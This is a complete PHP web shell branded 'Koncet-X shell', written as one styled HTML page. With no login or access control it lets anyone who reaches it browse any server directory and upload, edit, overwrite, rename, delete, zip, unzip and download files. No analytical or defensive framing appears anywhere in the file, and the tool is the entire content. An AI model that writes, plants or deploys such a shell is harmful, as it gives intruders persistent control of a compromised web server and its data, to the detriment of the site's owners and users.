<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>:: Koncet-X shell ::</title>

<style>
:root{
  --bg:#020302;
  --panel:#040a07;
  --panel2:#07140f;
  --line:#0f3a28;
  --green:#00ff66;
  --green-glow:#00ff99;
  --text:#d9ffe9;
  --muted:#5fae86;
}
*{box-sizing:border-box}
body{
  margin:0;
  background:
    radial-gradient(1000px 600px at 50% -250px,#062016,#020302),
    #020302;
  color:var(--text);
  font-family:Segoe UI,Arial;
  font-size:13px;
}
header{
  background:linear-gradient(180deg,#060f0b,#030807);
  border-bottom:1px solid var(--line);
  padding:14px 18px;
}
h1{
  margin:0;
  color:var(--green);
  font-size:21px;
  letter-spacing:1.2px;
  text-shadow:
    0 0 6px rgba(0,255,102,.35),
    0 0 14px rgba(0,255,153,.15);
}
.bar{
  display:flex;
  gap:8px;
  margin-top:10px;
  flex-wrap:wrap;
}
input,textarea,select{
  background:#030907;
  color:var(--green);
  border:1px solid var(--line);
  padding:8px;
  border-radius:6px;
  outline:none;
}
.btn{
  background:linear-gradient(180deg,#0a2a1b,#061c13);
  border:1px solid #1e7a4f;
  color:var(--text);
  padding:8px 14px;
  border-radius:6px;
  cursor:pointer;
}
.btn:hover{
  background:linear-gradient(180deg,#0f3a26,#0a2a1b);
}
a{
  color:var(--green-glow);
  text-decoration:none;
}
a:hover{
  text-decoration:underline;
  text-shadow:0 0 6px rgba(0,255,153,.35);
}
.container{padding:18px}
table{
  width:100%;
  border-collapse:collapse;
  margin-top:12px;
  background:var(--panel);
}
th,td{
  padding:10px;
  border-bottom:1px solid var(--line);
}
th{
  color:var(--muted);
  text-align:left;
  font-weight:500;
  background:var(--panel2);
}
tr:hover td{background:#04130c}
.type{color:#66ffb2}
.size{color:#7fae98;font-size:12px}
.perm{color:#7dffbf;font-size:12px}
.breadcrumb a{margin-right:6px;color:#4dff9a}
.tools{
  display:flex;
  gap:8px;
  flex-wrap:wrap;
  margin-bottom:10px;
}
</style>
</head>
<body>

<?php
/* ===== PATH ===== */
$path = isset($_GET['path']) ? realpath($_GET['path']) : realpath(__DIR__);
if(!$path) $path = realpath(__DIR__);
$parent = dirname($path);

/* ===== ACTIONS ===== */
if(isset($_FILES['up'])) @move_uploaded_file($_FILES['up']['tmp_name'],$path.'/'.$_FILES['up']['name']);
if(isset($_POST['mkdir'])) @mkdir($path.'/'.$_POST['dirname']);
if(isset($_GET['del'])){
  $t = realpath($_GET['del']);
  if($t && strpos($t,$path)===0){
    if(is_file($t)) @unlink($t);
    if(is_dir($t)) @rmdir($t);
  }
}
if(isset($_POST['rename'])) @rename($_POST['old'], dirname($_POST['old']).'/'.$_POST['new']);
if(isset($_POST['save'])) @file_put_contents($_POST['file'], $_POST['content']);
if(isset($_POST['zip'])){
  $zip=new ZipArchive();
  $zname=$path.'/'.($_POST['zipname'] ?: 'archive').'.zip';
  if($zip->open($zname,ZipArchive::CREATE)){
    foreach($_POST['files'] ?? [] as $f){
      $full=$path.'/'.$f;
      if(is_file($full)) $zip->addFile($full,$f);
    }
    $zip->close();
  }
}
if(isset($_GET['unzip'])){
  $z=realpath($_GET['unzip']);
  if($z){
    $zip=new ZipArchive();
    if($zip->open($z)){$zip->extractTo($path);$zip->close();}
  }
}
function perms($f){ return substr(sprintf('%o', fileperms($f)), -4); }

/* ===== FILTERS ===== */
$q = trim($_GET['q'] ?? '');
$sort = $_GET['sort'] ?? 'name';

/* ===== LIST ===== */
$items = array_values(array_filter(scandir($path), fn($x)=>$x!=='.'));
usort($items,function($a,$b)use($path,$sort){
  $fa=$path.'/'.$a; $fb=$path.'/'.$b;
  if(is_dir($fa)!==is_dir($fb)) return is_dir($fa)?-1:1;
  if($sort==='size') return (filesize($fa)??0) <=> (filesize($fb)??0);
  return strcasecmp($a,$b);
});
if($q) $items = array_values(array_filter($items, fn($f)=>stripos($f,$q)!==false));
?>

<header>
  <h1>Koncet-X shell</h1>
  <div class="bar">
    <form method="get" style="display:flex;gap:8px;flex:1">
      <input style="flex:1" name="path" value="<?=htmlspecialchars($path)?>">
      <button class="btn">GO</button>
    </form>
    <a class="btn" href="?path=<?=htmlspecialchars($parent)?>">Back</a>
  </div>

  <div class="breadcrumb bar">
    <?php
      $root = realpath(__DIR__);
      $acc=$root;
      echo "<a href='?path=$root'>ROOT</a>/";
      foreach(explode(DIRECTORY_SEPARATOR, trim(str_replace($root,'',$path),DIRECTORY_SEPARATOR)) as $p){
        if(!$p) continue;
        $acc.=DIRECTORY_SEPARATOR.$p;
        echo "<a href='?path=$acc'>$p</a>/";
      }
    ?>
  </div>
</header>

<div class="container">

<div class="tools">
  <form method="post" enctype="multipart/form-data">
    <input type="file" name="up">
    <button class="btn">Upload</button>
  </form>

  <form method="post">
    <input name="dirname" placeholder="New folder">
    <button class="btn" name="mkdir">Create</button>
  </form>

  <form method="get">
    <input name="q" placeholder="Search" value="<?=htmlspecialchars($q)?>">
    <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
    <button class="btn">Find</button>
  </form>

  <form method="get">
    <select name="sort">
      <option value="name">Sort: Name</option>
      <option value="size">Sort: Size</option>
    </select>
    <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
    <button class="btn">Apply</button>
  </form>
</div>

<form method="post">
<table>
<tr>
  <th></th><th>Name</th><th>Type</th><th>Size</th><th>Perm</th><th>Actions</th>
</tr>
<?php foreach($items as $f):
$full=$path.'/'.$f; ?>
<tr>
  <td><input type="checkbox" name="files[]" value="<?=htmlspecialchars($f)?>"></td>
  <td><?php if(is_dir($full)) echo "<a href='?path=$full'>$f</a>"; else echo htmlspecialchars($f); ?></td>
  <td class="type"><?=is_dir($full)?'DIR':strtoupper(pathinfo($f,PATHINFO_EXTENSION))?></td>
  <td class="size"><?=is_file($full)?number_format(filesize($full)).' B':'-'?></td>
  <td class="perm"><?=perms($full)?></td>
  <td>
    <?php if(is_file($full)): ?>
      <a href="?edit=<?=$full?>&path=<?=$path?>">Edit</a> |
      <a href="<?=$full?>" download>Download</a> |
    <?php endif; ?>
    <a href="?rename=<?=$full?>&path=<?=$path?>">Rename</a> |
    <a href="?del=<?=$full?>&path=<?=$path?>">Delete</a>
    <?php if(pathinfo($f,PATHINFO_EXTENSION)==='zip'): ?>
      | <a href="?unzip=<?=$full?>&path=<?=$path?>">Unzip</a>
    <?php endif; ?>
  </td>
</tr>
<?php endforeach; ?>
</table>

<div class="tools" style="margin-top:8px">
  <input name="zipname" placeholder="archive name">
  <button class="btn" name="zip">ZIP selected</button>
</div>
</form>

<?php if(isset($_GET['edit'])):
$file=$_GET['edit']; ?>
<form method="post" style="margin-top:14px">
  <input type="hidden" name="file" value="<?=$file?>">
  <textarea name="content" style="width:100%;height:340px"><?=htmlspecialchars(file_get_contents($file))?></textarea>
  <button class="btn" name="save">Save</button>
</form>
<?php endif; ?>

<?php if(isset($_GET['rename'])):
$old=$_GET['rename']; ?>
<form method="post" style="margin-top:14px">
  <input type="hidden" name="old" value="<?=$old?>">
  <input name="new" value="<?=basename($old)?>">
  <button class="btn" name="rename">Rename</button>
</form>
<?php endif; ?>

</div>
</body>
</html>
